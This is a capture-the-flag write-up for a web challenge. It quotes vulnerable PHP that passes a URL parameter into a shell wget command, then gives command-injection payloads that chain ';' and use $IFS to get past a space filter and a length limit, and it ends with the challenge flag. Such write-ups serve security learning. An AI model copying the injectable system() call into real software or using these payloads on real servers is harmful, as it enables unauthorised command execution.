# random-web1

We need to put the source param to view the source code of the app.
```php
 <?php
error_reporting(0);
(isset($_GET['source']) AND show_source(__FILE__) AND die()); 
if(isset($_REQUEST['p'])){
    
    $p = preg_replace('/[^\x21-\x7e]/','', $_REQUEST['p']);
    $p = str_replace("flag", "", $p);
    $p = substr($p,0,9);
    
    system("wget -qO - " . $p . " 2>&1");
}
?>
<!-- /?source --> 
```

By looking at the source code we can see that it takes the first 9 chars of our input, takes out the word flag from the input and checks if we have any char not in the **0x21-0x7e** ascii range.
So we can't use spaces.

My first payload:
```sh
/?p=;ls
```
I got out of this that there is a file named flag.php.

My second payload:
```sh
/?p=;m4${IFS}*
```
(${IFS} is a special char that replaces spaces in the terminal)
However this payload is 10 chars so it wont work.
But I found out that the ${IFS} char sometimes can be just $IFS.

My final payload:
```sh
/?p=;m4$IFS*
```
The flag was in a comment on the page, by right clicking the page and selecting view source code we can see the flag. 

flag: `CTF{a9b6b13862f0a8d1312d777a91a596eba7cb010f}`